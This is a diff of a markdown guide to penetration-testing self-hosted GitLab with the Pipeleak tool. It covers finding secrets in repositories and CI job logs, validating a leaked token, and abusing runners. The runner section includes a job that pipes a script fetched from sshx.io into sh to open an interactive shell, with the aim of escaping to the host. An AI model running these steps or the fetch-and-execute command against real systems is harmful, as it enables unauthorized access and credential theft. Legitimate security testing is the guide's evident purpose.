@@ -1,31 +1,28 @@
 # Pipeleak - A Guide To (self-hosted) GitLab Pentesting
 
-Many comapanies nowadays use (self-hosted) GitLab instance for managing their source codes. In times where a lot of infrastructure is deployed as code (IaC) these configurations must be source controlled as well, putting a lot of responsibility in the source code platform used.
+Many companies use (self-hosted) GitLab instances to manage their source codes. In times when a lot of infrastructure is deployed as code (IaC) these configurations must be source-controlled as well, putting a lot of responsibility on the source code platform used.
 
-The following chapters show different areas to anlayze and find misconfigurations.
+# Anonymous Access 
+If you do not have credentials for the GitLab instance you might want to look at the public repositories and test if you can sign up for an account.
 
-# Access Control
+You can list the public projects under the path `/explore` for example `https://leakycompany.com/explore`. 
 
-## Anonymous Access 
-If you do not have credentials for the GitLab instance you might want to have a look at the public repositories and test if you can sign up for an account.
-You can list the public projects under the path `/explore` for exmaple `https://leakycompany.com/explore`. 
-See if you can already identify potentially sensitive data e.g. credentials in source code or just generally repositories which should not be public. 
-[Trufflehog](https://github.com/trufflesecurity/trufflehog) is great tool which automates this.
+See if you can already identify potentially sensitive data e.g. credentials in source code or just generally repositories that should not be public. 
+[Trufflehog](https://github.com/trufflesecurity/trufflehog) is a great tool that automates this.
 
 The next step would be to try to create an account. Head to `https://leakycompany.com/users/sign_up` and try to register a new account.
-Sometimes you can only create an account with an email address managed by the customer, some instances require the admins to accept the register request, others completely disable it.
+Sometimes you can only create an account with an email address managed by the customer, some instances require the admins to accept the register request, and others completely disable it.
 
-## Authenticated Access 
+# Authenticated Access 
 
 Sweet now you have access to the GitLab instance with an account.
-The fist thing to look out for: What projects do I have access to? Is it more than unauthenticated? 
-Some companies grant their developers `developer` access to each repository, this might become interesting later.
+The first thing to look out for: What projects do I have access to? Is it more than unauthenticated? 
+Some companies grant their developers `developer` access to each repository, this might become interesting.
 
-
-# Misconfigurations
+# Misconfigurations And Mishandling
 
 ## Secret Detection in Source Code
-Manually looking for sensitive infos can now be cumbersome and should be automated.
+Manually looking for sensitive info can be cumbersome and should be partially automated.
 
 Use Trufflehog to find secrets in the source code:
 ```bash
@@ -34,24 +31,23 @@ trufflehog gitlab --token=glpat-[secret]
 
 > To create a Personal Access Token https://leakycompany.com/-/user_settings/personal_access_tokens
 
-Note this only scanned repository you have access to.
+Note this only scanned repository you have access to. You can specify single repositories as well.
 
 ## Secret Detection in Pipelines And Artifacts
 
-Nowadays most repositories make use of CI/CD pipelines. A config files per repository `.gitlab-ci.yml` defines what jobs are executed.
+Nowadays most repositories make use of CI/CD pipelines. A config file per repository `.gitlab-ci.yml` defines what jobs are executed.
 
-There are many problems that can arise when misconfiguring these.
+Many problems can arise when misconfiguring these.
 
 * People print sensitive environment variables in the public job logs
 * Debug logs contain sensitive information e.g. private keys or personal access tokens
 * Created Artifacts contain sensitive stuff
 
-
-**A few examples found in the wild:**
+**A few job output logs examples found in the wild:**
 
 ```bash
 # Example 0
-# Variations of this include e.g. `printenv`, `env` etc.
+# Variations of this include e.g. `printenv`, `env` commands etc.
 $ echo $AWS_ACCESS_KEY_ID
 AKI[removed]
 $ echo $AWS_SECRET_ACCESS_KEY
@@ -80,7 +76,8 @@ $ cat ./creds/serviceaccount.json
   "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
   "client_x509_cert_url": "[removed]",
   "universe_domain": "googleapis.com"
-}$ terraform init
+}
+$ terraform init
 Initializing the backend...
 Successfully configured the backend "[removed]"! Terraform will automatically
 use this backend unless the backend configuration changes.
@@ -95,7 +92,7 @@ $ echo "$PRIVATE_KEY"
 [removed]
 ```
 
-There are many reasons why credentials might be included in the job output. Moreover it is important to review generated artifacts as well. It is possible that credentials are not logged in the output but later saved in artifacts, that can be downloaded.
+There are many reasons why credentials might be included in the job output. Moreover, it is important to review generated artifacts as well. It is possible that credentials are not logged in the output but later saved in artifacts, that can be downloaded.
 
 **Automating Pipeline Credential Leaks**
 
@@ -119,11 +116,11 @@ $ pipeleak scan --token glpat-[removed] --gitlab https://gitlab.com -c [gitlab s
 
 Review the findings manually and tweak the flags according to your needs.
 
-If you found any valid credentials, e.g personal access tokens, cloud credentials and so on, check if you can move laterally or escalate privileges.
+If you found any valid credentials, e.g. personal access tokens, cloud credentials, and so on, check if you can move laterally or escalate privileges.
 
-**An example for privilege escalation:**
+**An example of privilege escalation:**
 
-Pipeleak identified the following based64 encode secret:
+Pipeleak identified the following based64 encode secret in the environment variable `CI_REPO_TOKEN`:
 
 ```bash
 CI_SERVER=yes
@@ -132,14 +129,14 @@ FF_SET_PERMISSIONS_BEFORE_CLEANUP=true
 CI_COMMIT_SHORT_SHA=998068b1
 ```
 
-Decoding it shows that it is gitlab personal access token, which is valid.
+Decoding it shows that it is a GitLab personal access token, which is valid.
 ```bash
 # Decoding the PAT
 $ base64 -d
 Z[removed]s=
 glpat-[remvoed]
 
-# Verify
+# Verify using the API
 curl --request GET --header "PRIVATE-TOKEN: glpat-[removed]" https://gitlab.com/api/v4/user/ | jq
 
 {
@@ -152,20 +149,20 @@ curl --request GET --header "PRIVATE-TOKEN: glpat-[removed]" https://gitlab.com/
 }
 ```
 
-Using this access token grants you access to the repository, thus escalating your privileges to this repository.
+Abusing this access token grants you access to the repository, thus escalating your privileges to this repository.
 
 ## Attacking Runners
 
-Chances are high that if pipelines are used, custom runners are registered. These come in different flavours. Most of the time the docker executor is used, which allows pipelines to define container images in which their commands are executed in. For a full list of possibilites [rtfm](https://docs.gitlab.com/runner/executors/).
+Chances are high that if pipelines are used, custom runners are registered. These come in different flavors. Most of the time the docker executor is used, which allows pipelines to define container images in which their commands are executed. For a full list of possibilities [rtfm](https://docs.gitlab.com/runner/executors/).
 
-If you are able to create projects or contribute to existing one, you are able to interact with runners.
-We want to test if it is possible to escape from the runner context e.g. escape from the container to the host machine or if the runner leaks additional privileges e.g. in form of attached files or environment variables set by the runner config.
+If you can create projects or contribute to existing ones, you can interact with runners. We want to test if it is possible to escape from the runner context e.g. escape from the container to the host machine or if the runner leaks additional privileges e.g. in the form of attached files or environment variables set by the runner config.
 
-First you need to enumerate what (shared) runners are available.
-Doing this manually create a project or navigate to an existing one.
-Open the CI/CD Settings page and look th the Runners section: https://leakycompany.com/my-pentest-prject/-/settings/ci_cd
+First, you need to enumerate what (shared) runners are available.
+Doing this manually by creating a project or navigating to an existing one.
+Open the CI/CD Settings page and look at the Runners section: https://leakycompany.com/my-pentest-prject/-/settings/ci_cd
+Runners can be attached globally, on the group level or on individual projects.
 
-Using pipeleak we can automate this:
+Using pipeleak we can automate runner enumeration:
 ```bash
 $ pipeleak runners --token glpat-[removed] --gitlab https://gitlab.com -v list
 2024-09-26T14:26:54+02:00 INF group runner description=2-green.shared-gitlab-org.runners-manager.gitlab.com name=comp-test-ia paused=false runner=gitlab-runner tags=gitlab-org type=instance_type
@@ -176,7 +173,7 @@ $ pipeleak runners --token glpat-[removed] --gitlab https://gitlab.com -v list
 2024-09-26T14:26:55+02:00 INF Done, Bye Bye 🏳️‍🌈🔥
 ```
 
-Review the runners and select the interesting ones. The Gitlab Ci/CD config file allows you to select runnes by their tags. Thus we create a list of the most interesting tags, printed by the command above.
+Review the runners and select the interesting ones. The Gitlab Ci/CD config file allows you to select runners by their tags. Thus we create a list of the most interesting tags, printed by the command above.
 
 Pipeleak can generate a `.gitlab-ci.yml` or directly create a project and launch the jobs.
 
@@ -212,12 +209,12 @@ $ pipeleak runners --token glpat-[removed]  --gitlab https://gitlab.com -v explo
 2024-09-26T14:33:48+02:00 DBG Verbose log output enabled
 2024-09-26T14:33:49+02:00 INF Created project name=pipeleak-runner-exploit url=https://gitlab.com/[removed]/pipeleak-runner-exploit
 2024-09-26T14:33:50+02:00 INF Created .gitlab-ci.yml file=.gitlab-ci.yml
-2024-09-26T14:33:50+02:00 INF Check pipelines logs manually url=https://gitlab.com/[removed]/pipeleak-runner-exploit/-/pipelines
+2024-09-26T14:33:50+02:00 INF Check pipeline logs manually url=https://gitlab.com/[removed]/pipeleak-runner-exploit/-/pipelines
 2024-09-26T14:33:50+02:00 INF Make sure to delete the project when done
 2024-09-26T14:33:50+02:00 INF Done, Bye Bye 🏳️‍🌈🔥
 ```
 
-If you check the log output you can see the outputs of the commands defined in `script` and an [sshx](https://sshx.io/) Url which gives you a shell in your runner.
+If you check the log output you can see the outputs of the commands defined in `script` and an [sshx](https://sshx.io/) Url which gives you an interactive shell in your runner.
 
 ```bash
 $ echo "Pipeleak exploit job"
@@ -250,4 +247,6 @@ $ curl -sSf https://sshx.io/get | sh -s run
   ➜  Shell: /bin/bash
 ```
 
-From the interactive shell you can now try breakout to the host, or find runner  misconfigurations e.g. host mounted volumes.
+From the interactive shell, you can now try breakout to the host, or find runner misconfigurations e.g. host mounted volumes.
+
+Happy Hacking
